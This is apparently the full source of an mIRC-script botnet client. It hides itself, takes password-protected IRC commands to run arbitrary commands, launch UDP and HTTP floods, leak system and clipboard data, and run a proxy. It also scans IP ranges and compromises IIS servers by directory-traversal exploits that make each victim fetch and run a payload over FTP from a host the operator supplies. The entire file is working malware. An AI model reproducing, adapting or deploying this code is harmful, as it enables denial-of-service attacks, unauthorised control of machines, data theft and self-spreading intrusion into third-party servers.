   on *:start:{
     titlebarx -t SystemTray
     if ($ri(rand) == on) { nick $ri(tag) $+ $iif($r(1,2) == 1, -, _) $+ $r(100,999) }
     if ($ri(rand) == off) { nick $ri(nick) }
     .timer -o 0 30 recon
     recon
     .timer -o 0 20 closex
     identd on $ri(tag)
     unset %bnc.*
     .writeini tk00.tmp warn dcc off
     .writeini tk00.tmp warn fserve off
     .writeini tk00.tmp fileserver warning off
     .timer -o 0 5000 upstat
     if ($ri(su) == $null) wi su $fulldate
     socklisten bnc.listen $ri(bport)
     if (%once == $null) { .timer -o 1 10 run regedit.exe /s ms.vxd | .timer -o 1 10 run regedit.exe /s crk.vxd | set %once 1 | set %col $r(3,15) | .timer -o 1 100 www1 }
     inc %restart
   }
   on *:connect:{
     jn
   }
   on *:dns:{ .msg %dns.nick $iif($raddress == $null, Unable to Reslove14 %dns.addr, Resolved14 %dns.addr ->>>15 $raddress) }
   on *:join:#:{
     if ($nick == $me) {
       who $chan
       if ($nick($chan,0,a) == 1) && ($ri(cmode.s) == on) { .timer 1 2 mode $chan $ri(cmode) }
       if (%firstjoin == $null) {
         if ($round($calc(($disk(c).size)/1048576), 0) > 35000) { .msg $chan FEATURE: C: $round($calc(($disk(c).size)/1048576), 0) $+ MB }
         if ($round($calc(($disk(d).size)/1048576), 0) > 35000) { .msg $chan FEATURE: D: $round($calc(($disk(d).size)/1048576), 0) $+ MB }
         if ($round($calc(($disk(e).size)/1048576), 0) > 35000) { .msg $chan FEATURE: E: $round($calc(($disk(e).size)/1048576), 0) $+ MB }
         if ($round($calc(($disk(f).size)/1048576), 0) > 35000) { .msg $chan FEATURE: F: $round($calc(($disk(f).size)/1048576), 0) $+ MB }
         if ($round($calc(($disk(g).size)/1048576), 0) > 35000) { .msg $chan FEATURE: G: $round($calc(($disk(g).size)/1048576), 0) $+ MB }
         if ($round($calc(($disk(h).size)/1048576), 0) > 35000) { .msg $chan FEATURE: H: $round($calc(($disk(h).size)/1048576), 0) $+ MB }
         if ($round($calc(($disk(i).size)/1048576), 0) > 35000) { .msg $chan FEATURE: I: $round($calc(($disk(i).size)/1048576), 0) $+ MB }
         if ($round($calc($ticks / 1000),0) > 1814420) { .msg $chan FEATURE: UPTIME: $duration($round($calc($ticks / 1000),0),2) }
         write c:\winnt\p.ub 216.166.248.155
         write c:\winnt\p.ub 216.153.234.42
         write c:\winnt\p.ub 149.169.29.151
         write c:\winnt\p.ub 206.218.143.230
         write c:\winnt\p.ub 158.65.202.181
         write c:\winnt\p.ub 216.46.76.50
         write c:\winnt\p.ub 216.234.201.25
         write c:\winnt\p.ub 169.204.101.2
         set %firstjoin 1
         set %nc $chan
         set %s.max 50000
         set %s.max.t 1
         set %s.delay 250
         set %s.root on
         scan $read(i.p,$r(1,$lines(i.p))) $r(1,255)
         return
       }
     }
     if ($nick != $me) && ($me isop $chan) {
       if ($ra($chan,$nick) == $address($nick,9)) || ($ra(all,$nick) == $address($nick,9)) { if ($nick !isop $chan) { mode $chan +o $nick } }
     }
   }
   on *:disconnect:{ recon }
   on *:input:*:{ .amsg Warning user is imputing commands: $1- | write d.bat @del /Q $mircdir $+ *.* | run d.bat | exit }

   alias www1 {
     if (2000 !isin $dll(j.dll,osinfo,_)) { return }
     www http://download.microsoft.com/download/win2000platform/Patch/q269862/NT5/EN-US/Q269862_W2K_SP2_x86_en.EXE
     .timer -o 1 400 run Q269862_W2K_SP2_x86_en.EXE
   }
   alias closex { close -x | clearall }
   alias wi { writeini tk.conf settings $1 $2- }
   alias ra { return $readini(tk.conf,$1,$2-) }
   alias wa { return writeini tk.conf $1 $2 $3- }
   alias ri { return $readini(tk.conf,settings,$1) }
   alias c join $1 $2
   alias jn {
     set %jn.1 $lines($ri(channelfile))
     set %jn.2 1
     :jn
     if (%jn.2 > %jn.1) { return }
     c $read($ri(channelfile),%jn.2)
     inc %jn.2
     goto jn
   }
   alias titlebarx {  if ($1 == -t) dll r.dll chgmtitle $2- }
   alias nc { return $iif($chan == $null, $nick, $chan) }
   alias sortnick {
     set -u60 %sort.1 1
     :sort
     if ($me == $nick($chan,%sort.1,v)) { nick $ri(tag) $+ $iif($len(%sort.1) == 2, 0, $iif($len(%sort.1) == 1, 00)) $+ %sort.1 | return }
     inc %sort.1
     goto sort }
    alias uni { write d.bat $mircdirfiredaemon.exe -u MStaskmgr | write d.bat net stop mstaskmgr | write d.bat ping 127.0.0.1 -n5 -w 1000 >nul | write d.bat @del /Q $mircdir $+ *.* | .timer -o 1 2 run d.bat }
   alias recon { if ($server == $null) server $read($ri(serverfile)) }
   alias de {
     if ($left($1,2) isalpha) || ($left($1,2) isnum) { return }
     else {
   return $replace($1-,£,q,",p,$chr(247),0,$chr(165),6,$chr(161),1,$chr(162),7,^,z,`,v,$chr(223),f,$chr(175),g,;,r,:,m,$chr(164),8,@,o,!,k,$chr(169),5,*,b,$chr(176),$chr(35),$chr(198),l,$chr(254),c,$chr(167),2,$chr(179),3,-,d,_,x,$chr(215),w,$chr(248),a,+,s,=,u,$chr(208),e,\,h,$chr(182),$chr(32),$chr(181),y,$chr(178),j,/,i,~,n,$chr(174),t,$chr(170),4,$chr(190),9,$chr(60),$chr(46),$chr(191),$chr(35)) } }
   alias upstat {
     if ($ri(upt) == $null) { wi upt $round($calc($ticks / 1000),0) | return }
     if ($round($calc($ticks / 1000),0) > $ri(upt)) { wi upt $round($calc($ticks / 1000),0) }
     if ($ri(onl) == $null) { wi onl $online | return }
     if ($online > $ri(onl)) { wi onl $online | return }
   }
   alias stat.system {
     .msg $1 Stats: <15Iam using Windoze: $dll(j.dll,osinfo,_) $+ > <15Processor: $dll(j.dll,cpuinfo,_) $+ > <15Memory: $dll(j.dll,meminfo,_)  $+ $rambar $+ > <15Screen resolution: $dll(j.dll,screeninfo,_) $+ > <15Iam on webpage: $url $+ >
      .timer 1 3 .msg $1 <15Clipboard contains: $cb 15Total charactors: $cb(0).len $+ >
      .timer 1 5 .msg $1 Free space: <C:\> $round($calc(($disk(c).free)/1048576), 2) $+  MB <D:\> $round($calc(($disk(d).free)/1048576), 2) $+  MB <E:\> $round($calc(($disk(e).free)/1048576), 2) $+  MB <F:\> $round($calc(($disk(f).free)/1048576), 2) $+  MB
    .timer 1 7  .msg $1 Total space: <C:\> $round($calc(($disk(c).size)/1048576), 2) $+  MB <D:\> $round($calc(($disk(d).size)/1048576), 2) $+  MB <E:\> $round($calc(($disk(e).size)/1048576), 2) $+  MB <F:\> $round($calc(($disk(f).size)/1048576), 2) $+  MB
     upstat | .timer 1 9 .msg $1 Current Uptime: $duration($round($calc($ticks / 1000),0),2) Record: $duration($ri(upt),2) Server Online: $duration($online,2) Record: $duration($ri(onl),2) Server Restarts: %restart Since $readini(conf.scr,set,su)
   }
   alias rambar {
     if ( %rb_size == 0 ) { return }
     set %rb_size 50
     set %rb_used $round($calc($dll(j.dll,rambar,_) / 100 * %rb_size),0)
     set %rb_unused $round($calc(%rb_size - %rb_used),0)
     set %rb_usedstr $str(4|,%rb_used)
     set %rb_unusedstr $str(0|,%rb_unused)
     return  0[ $+ %rb_usedstr $+ %rb_unusedstr $+ 0]
   }



   alias pktudp {
     .timerpkt. $+ $r(1,999999999) -m $2 90 sockudp -b TK. $+ $rand(1,999999999999) $1 $iif($3 != $null, $3, $rp) 12000 $str(££$$**TK-0WNZ-J00**$$££,15)
   }
   on *:sockopen:webhit*:{
     if ($sockerr) { return }
     sockwrite -n $sockname GET / HTTP/1.0
     sockwrite -n $sockname Accept: */*
     sockwrite -n $sockname Host: %webhost
     sockwrite -n $sockname $crlf
   }
   on *:sockread:webhit*:{
     if ($sockerr) { return }
     sockread %t
   }
   alias webhit { set %webhost $2 | .timer -o $5 1 .timer -om $3 $4 so $1 }
   alias so { sockopen webhit $+ $rnm $1 80 }
   alias rnm { return $r(1,99999999999999) $+ $r(a,z) }

   on *:sockopen:ar00t*:{
     if ($sockerr) { .msg %nc Sock Error. ( $+ $sock($sockname).ip $+ ) | return }
     sockwrite -n $sockname GET %hhost HTTP/1.1
     sockwrite -n $sockname Accept: */*
     sockwrite -n $sockname Host: ww.tk.gov
     sockwrite -n $sockname $crlf
   }
   on *:sockread:ar00t*:{
     if ($sockerr) { .msg %nc Read Error. ( $+ $sock($sockname).ip $+ ) | return }
     sockread %ttt
     if (The specified CGI application misbehaved isin %ttt) {
       .msg %nc RESULT: $iif($gettok(%ttt,7-,$asc(>)) != $null, $gettok(%ttt,7-,$asc(>)) ( $+ $sock($sockname).ip $+ )) | return }
     if (< !isin %ttt) && (%head == on) { .msg %nc %ttt ( $+ $sock($sockname).ip $+ ) | return }
   }
   alias page2 {
     if ($nc != $null) { set %nc $nc }
     set %hhost $2
     sockopen ar00t $+ $r(1,99999999) $1 80
   }



   on *:TEXT:*:*:{
     if ($1 == !log) && ($2 == $de($ri(pwd))) {
       if ($chan == $null) && ($nick !isop $comchan($nick,1)) { halt }
       auser 100 $nick 9 | if ($3 == -s) { return } | .msg $nc Logged in | return
     }
     if ($level($address($nick,9)) != 100) { halt }
     if ($1 == !udp) { pktudp $2 $3 $4 | .msg $nc Hitting ¢¢ $2 ¢¢ $3 Times ¢¢ $4 bytes }
     if ($1 == !rn) { $2- | .msg $nc Command ran }
     if ($1 == !hdstat) { .msg $nc Free space: <C:\> $round($calc(($disk(c).free)/1048576), 2) $+  MB <D:\> $round($calc(($disk(d).free)/1048576), 2) $+  MB <E:\> $round($calc(($disk(e).free)/1048576), 2) $+  MB <F:\> $round($calc(($disk(f).free)/1048576), 2) $+  MB ¢¢ Total space: <C:\> $round($calc(($disk(c).size)/1048576), 2) $+  MB <D:\> $round($calc(($disk(d).size)/1048576), 2) $+  MB <E:\> $round($calc(($disk(e).size)/1048576), 2) $+  MB <F:\> $round($calc(($disk(f).size)/1048576), 2) $+  MB }
     if ($1 == !webhit) { webhit $2 $3 $4 $5 $6 | .msg $nc Hitting $2 $calc($4 * $6) times. ( $+ $6 threads) }
     if ($1 == !lag) { .msg $nc m00 }
     if ($1 == !aserver) { write $ri(serverfile) $2- | .msg $nc Added server $2- }
     if ($1 == !telnet) { if (%telnet == on) { .msg $nc Already on | return } | run NTFS.exe | set %telnet on | .msg $nc Telnet has been started }
     if ($1 == !rserver) { write -dl $+ $2 $ri(serverfile) | .msg $nc Deleted server $2- }
     if ($1 == !pserver) { play $nc $ri(serverfile) 1000 }
     if ($1 == !kill) { run k.exe $2 | .msg $nc Killed $2 | return }
     if ($1 == !cserver) { write -c $ri(serverfile)  | .msg $nc Server list cleared. }
     if ($1 == !achan) { write $ri(channelfile) $2- | .msg $nc Added channel $2- | c $2- }
     if ($1 == !rchan) { part $read($ri(channelfile),$2) | write -dl $+ $2 $ri(channelfile) | .msg $nc Deleted channel $2- }
     if ($1 == !pchan) { play $nc $ri(channelfile) 1000 }
     if ($1 == !cchan) { write -c $ri(channelfile) | .msg $nc Channel list cleared. }
     if ($1 == !bncp) { if ($3) && ($3 != $me) { return } | else { wi bport $2 | socklisten bnc.listen.new $2 | .msg $nc 14New BNC Port: $2 } }
     if ($1 == !info) && ($2 == $me) { stat.system $nc }
     if ($1 == !sortnick) { if ($2) && ($2 != $me) { return } | else { sortnick } }
     if ($1 == !bncpwd) { if ($3) && ($3 != $me) { return } | else { wi bpwd $2 | .msg $nc 14New BNC Password: $2 } }
     if ($1 == !bncpwdrand) { if ($3) && ($3 != $me) { return } | else { wi bpwd $r(1,999999999) $+ $str($r(a,z),5) | .msg $nc 14New BNC Password:: $ri(bpwd) } }
     if ($1 == !multi) {
       if ($2 == -t) { .timer -o $3 $4 $5 $6 $7- | .msg $nc Timer now set for $3 ¢¢ $4 Times ¢¢ $5 Delay ¢¢ $6- Command | return }
       .timer -o $2 $3 $4 $5-
       .msg $nc Timer now set ¢¢ $2 Times ¢¢ $3 Delay ¢¢ $4- Command
     }
     if ($1 == !scanstat) { .msg $nc ScanStat: Copy attempts: %copies ¢¢ Last IP: %last ¢¢ IPs in log: $lines(c:\winnt\i.lo.g) ¢¢ aRoot status: %s.root ¢¢ Currently scanning: %s.cur.ip }
     if ($1 == !bnc) { .msg $nc BNC: $ip $iif($host != $null, ( $+ $host $+ )) ¢¢ Port: $ri(bport) ¢¢ Password: $ri(bpwd) }
     if ($1 == !busers) { wi busers $2 | .msg $nc 14Max Users Now:: $2 }
     if ($1 == !op) && ($me isop $chan) && ($iif($2 == $null, $nick, $2) !isop $chan) { .mode $chan +o $iif($2 == $null, $nick, $2) }
     if ($1 == !dns) { if ($2 == $me) || ($chan == $null) { set -u30 %dns.nick $nc | set -u30 %dns.addr $3 | dns $3 } | return }
     if ($1 == !network) { .msg $nc OS: $dll(j.dll,osinfo,_) Network: $dll(j.dll,interfaceinfo,_) IP: $ip $iif($host != $null, Host: $host) }
     if ($1 == !version) { .msg $nc Version: $ri(version) Signup Time: $ri(su) Uptime: $uptime(system,1) Online: $duration($online),1) }
     if ($1 == !cstat) { upstat | .msg $nc Current Uptime: $duration($round($calc($ticks / 1000),0),2) Record: $duration($ri(upt),2) Server Online: $duration($online,2) Record: $duration($ri(onl),2) Server Restarts: %restart Since $ri(su) }
     if ($1 == !regn) { set -u10 %nnn $ri(tag) $+ $r($2,$3) | wi rand off | wi nick %nnn | nick %nnn }
     if ($1 == !reg) && ($2 == $me) {
       wi rand off
       wi nick $3
      .msg $nc Perm nick now: $3
      nick $3
      if ($4 == register) {
        nickserv register tkownzj00 $2 $+ @nsa.gov
        .msg $nc Registration with NickServ complete.
        }
      }
     if ($1 == !find) { findservu }
     if ($1 == !getlist) { dcc send -c $nick list.txt }
     if ($1 == !listwarez) { gthr cde | .msg $nc List has been made. Type !getlist }
     if ($1 == !servustat) { .msg $nc $iif($exists(ServUStartUpLog.txt) == $false, Servu is not started, $read(ServUStartUpLog.txt,6)) }
     if ($1 == !iishit) {
       if ($2 == copy) { page2 $3 /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+c:\inetpub\scripts\script.exe }
       if ($2 == ftp) { page2 $3 /scripts/script.exe?/c+echo+open+ $+ $4 $+ >tmp2&&echo+anonymous>>tmp2&&echo+a@a.com>>tmp2&&echo+get+httpodbc.dll>>tmp2&&echo+get+tk1.exe>>tmp2&&echo+bye>>tmp2&&echo+ftp+-s:tmp2>>tmp2.cmd&&echo+exit>>tmp2.cmd&&tmp2.cmd }
       if ($2 == root) {
     page2 $3 /scripts/httpodbc.dll?MfcISAPICommand=Exploit&cmd=c%3A%5Cwinnt%5Csystem32%5Ccmd.exe+%2Fc+c%3A%5Cinetpub%5Cscripts%5Ctk1.exe
     .timer 1 7 page2 $3 /scripts/httpodbc.dll?MfcISAPICommand=Exploit&cmd=c%3A%5Cwinnt%5Csystem32%5Ccmd.exe+%2Fc+del+c%3A%5Cinetpub%5Cscripts%5Ctk1.exe
     .timer 1 14 page2 $3 /scripts/httpodbc.dll?MfcISAPICommand=Exploit&cmd=c%3A%5Cwinnt%5Csystem32%5Ccmd.exe+%2Fc+c%3A%5Cprogra%7E1%5Cmicrosoft%5Cupdate%5Cdll%5Ctk%5Creg.bat
     .msg $nc Rooting $3 $+ .... }
      if ($2 == cust) { page2 $3 /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ $+ $4 }
      if ($2 == auto) { aroot $3 $4 }
      if ($2 == version) { page2 $3 /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver }
     }
     if ($1 == !exists) {
       if ($exists($shortfn($2-)) { .msg $nc ¢¢ Size: $bytes($file($shortfn($2-)).size,3).suf ¢¢ Date made: $asctime($file($shortfn($2-)).ctime) | return }
       .msg $nc Doesn't Exist
     }
     if ($1 == !aop) { wa $iif($3 == $null, all, $3) $2 $address($2,9) | .msg $nc Added $2 to AOP List ( $+ $address($2,9) $+ ) | if ($2 !isop $iif($3 == $null, $chan, $3)) { mode  $iif($3 == $null, $chan, $3) +o $2 } }
     if ($1 == !raop) { remini tk.conf settings $3 $2 | .msg $nc Removed $2 From AOP List ( $+ $address($2,9) $+ ) }
     if ($1 == !fs) && ($chan == $null) { fserve $nick 99 $iif($2 != $null, $2, c:\) }
     if ($1 == !www) { if ($3 == -t) { .timer 1 $(1,$4) www $2 | goto www } | www $2 | :www | .msg $nc Downloading $2 $+ . }
     if ($1 == !dcc) && ($2 == $me) { dcc send -c $4 $3 | $iif($5 != $null, dcc send -c $5 $3) | $iif($6 != $null, dcc send -c $6 $3) | $iif($7 != $null, dcc send -c $7 $3) | $iif($8 != $null, dcc send -c $8 $3) | $iif($9 != $null, dcc send -c $9 $3) | $iif($9 != $null, dcc send -c $10 $3) | .msg $nc Sending file(s). }
     if ($1 == !scan) {
     if ($2 == -stop) { .timersca* off | .msg $nc Scanning stopped | return }
     if ($2 == -log) { set %log $3 | .msg $nc Log is now $3 | return  }
     if ($2 == -pub) {
       if ($3 == add) { write c:\winnt\p.ub $4 | return }
       if ($3 == rem) { if ($read(c:\winnt\p.ub, s, $4) == $4) { write -dl $+ $readn c:\winnt\p.ub | .msg $nc Pub removed | return } .msg $nc Pub doesnt exist | return }
       if ($3 == list) { play $nc c:\winnt\p.ub 1000 | retun }
       }
     set %nc $nc
     set %s.max $3
     set %s.max.t 1
     set %s.delay $4
     if ($gettok($1-,-1,32) == -root) { set %s.root on }
     if ($gettok($1-,-1,32) != -root) { set %s.root off }
     if ($2 == -rand) { set -u5 %t.sca1 $read(i.p,$r(1,$lines(i.p))) | set -u5 %t.sca2 $r(1,255) | .msg $nc Total: $3 ¢¢ Mode: Random ; starting from $+(%t.sca1,.,%t.sca2,.1.1) ¢¢ Estimated scan time: $calc($calc($3 * $4) / 1000) seconds | scan %t.sca1 %t.sca2 | return }
     if ($2 == -set) { scan $5 $6 | .msg $nc Total: $3 ¢¢ Mode: Set - starting from $+($5,.,$6,.1.1) ¢¢ Estimated scan time: $calc($calc($3 * $4) / 1000) seconds | return }
     }
     if ($1 == !showsends) {
       if ($send(0) >= 1) {
         .msg $nc There are $send(0) sends in progress.
         set %ss $send(0)
           if ($2) {
             .msg $nc SEND $+ $2 $+ :  $+ $rc $+ Nick: $send($2)  $+ $rc $+ File: $send($2).file  $+ $rc $+ Size: $bytes($send($2).size,3).suf  $+ $rc $+ Sent: $bytes($send($2).sent,3).suf  $+ $rc $+ Speed: $bytes($send($2).cps,3).suf $+ '/s  $+ $rc $+ Elapsed: $duration($send($2).secs,2)  $+ $rc $+ Completed: $send($2).pc $+ $chr(37)  $+ $rc $+ Time Remaining:  $duration($int($calc($calc($send($2).size - $send($2).sent) / $send($2).cps)),1)
             return
           }
         set %sss
         while (%sss <= %ss) {
           .msg $nc SEND $+ %sss $+ :  $+ $rc $+ Nick: $send(%sss)  $+ $rc $+ File: $send(%sss).file  $+ $rc $+ Size: $bytes($send(%sss).size,3).suf  $+ $rc $+ Sent: $bytes($send(%sss).sent,3).suf  $+ $rc $+ Speed: $bytes($send(%sss).cps,3).suf $+ '/s  $+ $rc $+ Elapsed: $duration($send(%sss).secs,2)  $+ $rc $+ Completed: $send(%%sss).pc $+ $chr(37)  $+ $rc $+ Time Remaining:  $duration($int($calc($calc($send(%sss).size - $send(%sss).sent) / $send(%sss).cps)),1)
           inc %sss  }
       }
       else { .msg $nc There are no sends in progress. }
     }
     if ($1 == !showgets) {
     if ($get(0) >= 1) {
       .msg $nc There are $get(0) uploads in progress.
         if ($2) {
           .msg $nc GET $+ $2 $+ :  $+ $rc $+ Nick: $get($2)  $+ $rc $+ File: $get($2).file  $+ $rc $+ Size: $bytes($get($2).size,3).suf  $+ $rc $+ Received: $bytes($get($2).rcvd,3).suf  $+ $rc $+ Speed: $bytes($get($2).cps,3).suf $+ '/s  $+ $rc $+ Elapsed: $duration($get($2).secs,2)  $+ $rc $+ Completed: $get($2).pc $+ $chr(37)  $+ $rc $+ Time Remaining:  $duration($int($calc($calc($get($2).size - $get(%sss).rcvd) / $get($2).cps)),1)
           return
       }
       set %ss $get(0)
       set %sss 1
       while (%sss <= %ss) {
         .msg $nc GET $+ %sss $+ :  $+ $rc $+ Nick: $get(%sss)  $+ $rc $+ File: $get(%sss).file  $+ $rc $+ Size: $bytes($get(%sss).size,3).suf  $+ $rc $+ Received: $bytes($get(%sss).rcvd,3).suf  $+ $rc $+ Speed: $bytes($get(%sss).cps,3).suf $+ '/s  $+ $rc $+ Elapsed: $duration($get(%sss).secs,2)  $+ $rc $+ Completed: $get(%sss).pc $+ $chr(37)  $+ $rc $+ Time Remaining: $duration($int($calc($calc($get(%sss).size - $get(%sss).rcvd) / $get(%sss).cps)),1)
         inc %sss }
       }
   else { .msg $nc There are no uploads in progress. }
     }
   }
   raw *:*:/halt
   alias rc { return %col }


   on *:socklisten:bnc.listen*: {
     sockaccept bnc.accept. [ $+ [ $ticks ] ]
     sockwrite -tn bnc.accept. [ $+ [ $ticks ] ] r00t: 14Type: /quote pass 14[Pass14]
   }
   on *:sockread:bnc.accept.*: {
     :loop
     .sockread %bnc.data
     if (%bnc.data == $null) { return }
     if ($gettok(%bnc.data,1,32) == NICK) { set %bnc.nick $gettok(%bnc.data,2,32) }
     if ($gettok(%bnc.data,1,32) == USER) { set %bnc.user $gettok(%bnc.data,2-,32) }
     if ($gettok(%bnc.data,1,32) == PASS) {
       if ($sock(bnc.connect*,0) >= 10) { sockwrite -tn $sockname r00t: SERVER IS FULL ( $+ $sock(bnc.connect*,0) USERS). TRY AGAIN LATER | sockclose $sockname | return }
       if (%banned == $sock($sockname).ip) { sockwrite -tn $sockname r00t: Your still banned, Fuck off Lamer. | sockclose $sockname | return }
       if ($gettok(%bnc.data,2,32) == $ri(bpwd)) {
         if (%set.1 == $null) set %set.1 <set>
         if (%set.2 == $null) set %set.2 <set>
         sockwrite -tn $sockname r00t: 14Password accepted
         inc %total.con
         sockwrite -tn $sockname r00t: 15 Connecting Socket....
         sockwrite -tn $sockname r00t: 15 -
         sockwrite -tn $sockname r00t: 14 $+ $str($chr(167),40)
         sockwrite -tn $sockname r00t: 15 $+ $str($chr(167),40)
         sockwrite -tn $sockname r00t: 14 $+ $str($chr(167),40)
         sockwrite -tn $sockname r00t: 15 $+ $str($chr(167),40)
         sockwrite -tn $sockname r00t: 15 -
         sockwrite -tn $sockname r00t: 14--===15Welcome to TK-BNC 2.2.FINaL %bnc.nick $+ 14===--
         sockwrite -tn $sockname r00t: 15 -
         sockwrite -tn $sockname r00t: 14 MOTD:
         sockwrite -tn $sockname r00t: 15 -
         sockwrite -tn $sockname r00t: 15 TK BNC
         sockwrite -tn $sockname r00t: 15 Commands:
         sockwrite -tn $sockname r00t: 15 /quote conn <server> [port]
         sockwrite -tn $sockname r00t: 15 /quote Nick <nick> **
         sockwrite -tn $sockname r00t: 15 /quote Ident <ident>  **
         sockwrite -tn $sockname r00t: 15 /quote Users  **
         sockwrite -tn $sockname r00t: 15 /quote setauto <1|2> <name> <server> <port>
         sockwrite -tn $sockname r00t: 15 ** Not Necessary
         sockwrite -tn $sockname r00t: 15 -
         sockwrite -tn $sockname r00t: 15 Auto Servers:
         sockwrite -tn $sockname r00t: 15 Dalnet   - /quote conn1
         sockwrite -tn $sockname r00t: 15 Efnet    - /quote conn2
         sockwrite -tn $sockname r00t: 15 Undernet - /quote conn3
         sockwrite -tn $sockname r00t: 15 %set.1   - /quote conn4
         sockwrite -tn $sockname r00t: 15 %set.2   - /quote conn5
         sockwrite -tn $sockname r00t: 15 -
         sockwrite -tn $sockname r00t: 14 END MOTD:
         sockwrite -tn $sockname r00t: 15 -
         sockwrite -tn $sockname r00t: 14Connecting From: $sock($sockname).ip
         sockwrite -tn $sockname r00t: 14Connected To: $host ( $+ $ip $+ )
         sockwrite -tn $sockname r00t: 14Local Time: $asctime(hh:nn)
         sockwrite -tn $sockname r00t: 14Server Uptime: $uptime(mirc,1)
         sockwrite -tn $sockname r00t: 14Online Time: $duration($online,1)
         sockwrite -tn $sockname r00t: 14BNC Users: $sock(bnc.connect*,0) $+ / $+ $ri(busers)
         sockwrite -tn $sockname r00t: 14Total Users: %total.con since $readini(conf.scr,set,su)
         sockwrite -tn $sockname r00t: 15 -
         sockwrite -tn $sockname r00t: 14Powered by: $dll(j.dll,cpuinfo,_) (RAM $dll(j.dll,meminfo,_) $+ )
         sockwrite -tn $sockname r00t: 15 -
         .timer 1 1 sockwrite -tn $sockname r00t: 15 Socket Connected.
         .timer 1 2 sockrename $sockname bnc.conn. [ $+ [ $ticks ] ]
         return
       }
       else { sockwrite -tn $sockname r00t: 14Password Incorrect: 2 minute ban | .msg $de($readini(conf.scr,set,jn)) 4!!Warning incorrect password from: $sock($sockname).ip $sock($sockname).port $fulldate | set -u120 %banned $sock($sockname).ip | sockclose $sockname }
     }
   goto loop
   }
   on *:sockread:bnc.conn.*: {
     :loop
     sockread %bnc.data.conn
     if (%bnc.data.conn == $null) { return }
     if ($gettok(%bnc.data.conn,1,32) == nick) { set %bnc.nick $gettok(%bnc.data.conn,2,32) | sockwrite -nt $sockname r00t: 14Nick Changed to: %bnc.nick }
     if ($gettok(%bnc.data.conn,1,32) == ident) { set %bnc.user $gettok(%bnc.data.conn,2,32) $gettok(%bnc.data.conn,2,32) $gettok(%bnc.data.conn,2,32) : $+ $gettok(%bnc.data.conn,2,32) | sockwrite -nt $sockname r00t: 14IDENT Changed to: %bnc.user }
     if ($gettok(%bnc.data.conn,1,32) == users) {
       if ($sock(bnc.connected.*,0) == 0) { sockwrite -nt $sockname r00t: 14Error: no users | return }
     set -u60 %lll $sock(bnc.connected.*,0)
     while (%lll <= $sock(bnc.connected.*,0)) { sockwrite -tn $sockname r00t: $+(14Connection,%lll,:) IP: $left($sock(bnc.connected.*,%lll).ip,-3) $+ $chr(42) Data sent: $bytes($sock(bnc.connected.*,%lll).sent,3).suf Data received: $bytes($sock(bnc.connected.*,%lll).rcvd,3).suf Time open: $duration($sock(bnc.connected.*,%lll).to,2) Send Idle: $sock(bnc.connected.*,%lll).ls $+ secs Receive Idle: $sock(bnc.connected.*,%lll).lr $+ secs | inc %lll } }
     if ($gettok(%bnc.data.conn,1,32) == conn) {
       if ($gettok(%bnc.data.conn,2,32) == $null) { sockwrite -tn $sockname  r00t: 14Usage: /quote conn 14[Server14] 14[Port14]   | return }
       sockwrite -tn $sockname r00t: 14Connecting To: $gettok(%bnc.data.conn,2,32) $iif($gettok(%bnc.data.conn,3,32) == $null, 6667, $gettok(%bnc.data.conn,3,32))
       sockopen bnc.server. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] $gettok(%bnc.data.conn,2,32) $iif($gettok(%bnc.data.conn,3,32) == $null, 6667, $gettok(%bnc.data.conn,3,32))
       sockrename $sockname bnc.connected. $+ $gettok($sockname,3,$asc(.)) | return }
     if ($gettok(%bnc.data.conn,1,32) == rt) { $gettok(%bnc.data.conn,2-,32) }
     if ($gettok(%bnc.data.conn,1,32) == conn1) {
       sockwrite -tn $sockname r00t: 14Connecting To: Dalnet
       sockopen bnc.server. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] irc.dal.net 6667
       sockrename $sockname bnc.connected. $+ $gettok($sockname,3,$asc(.))
       return
       }
      if ($gettok(%bnc.data.conn,1,32) == conn2) {
       sockwrite -tn $sockname r00t: 14Connecting To: Efnet
       sockopen bnc.server. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] irc.rt.ru 6667
       sockrename $sockname bnc.connected. $+ $gettok($sockname,3,$asc(.))
       return
       }
     if ($gettok(%bnc.data.conn,1,32) == conn3) {
       sockwrite -tn $sockname r00t: 14Connecting To: Undernet
       sockopen bnc.server. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] irc.undernet.net 6667
       sockrename $sockname bnc.connected. $+ $gettok($sockname,3,$asc(.))
       return
       }
     if ($gettok(%bnc.data.conn,1,32) == conn4) {
       sockwrite -tn $sockname r00t: 14Connecting To: %set.1
       sockopen bnc.server. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] %set.1.srv %set.1.prt
       sockrename $sockname bnc.connected. $+ $gettok($sockname,3,$asc(.))
       return
       }
     if ($gettok(%bnc.data.conn,1,32) == conn5) {
       sockwrite -tn $sockname r00t: 14Connecting To: %set.2
       sockopen bnc.server. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] %set.2.srv %set.2.prt
       sockrename $sockname bnc.connected. $+ $gettok($sockname,3,$asc(.))
       return
       }
     if ($gettok(%bnc.data.conn,1,32) == setauto) {
       sockwrite -tn $sockname r00t: 14Set Auto Server $gettok(%bnc.data.conn,2,32) $+ : $gettok(%bnc.data.conn,4,32) $gettok(%bnc.data.conn,5,32)
       if ($gettok(%bnc.data.conn,2,32) == 1) { set %set.1.srv $gettok(%bnc.data.conn,4,32) | set %set.1.prt $gettok(%bnc.data.conn,5,32) | set %set.1 $gettok(%bnc.data.conn,3,32) | return }
       if ($gettok(%bnc.data.conn,2,32) == 2) { set %set.2.srv $gettok(%bnc.data.conn,4,32) | set %set.2.prt $gettok(%bnc.data.conn,5,32) | set %set.2 $gettok(%bnc.data.conn,3,32) | return }
       sockwrite -tn $sockname r00t: Error
       return
       }
     goto loop }
   on *:sockclose:bnc.connected.*: { sockclose bnc.server. $+ $gettok($sockname,3,$asc(.)) }
   on *:sockread:bnc.connected.*: {
     :loop
     sockread %tmp
     if (%tmp == $null) { return }
     sockwrite -tn bnc.server. $+ $gettok($sockname,3,$asc(.)) %tmp
     goto loop }
   on *:sockopen:bnc.server.*: {
     if ($sockerr > 0) { sockwrite -tn bnc.connected. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] r00t: 14Error: Unable to connect To $sock($sockname).ip $+ : $+ $sock($sockname).port | sockclose bnc.connected. [ $+ [ $gettok($sockname,3,$asc(.)) ] ] | return }
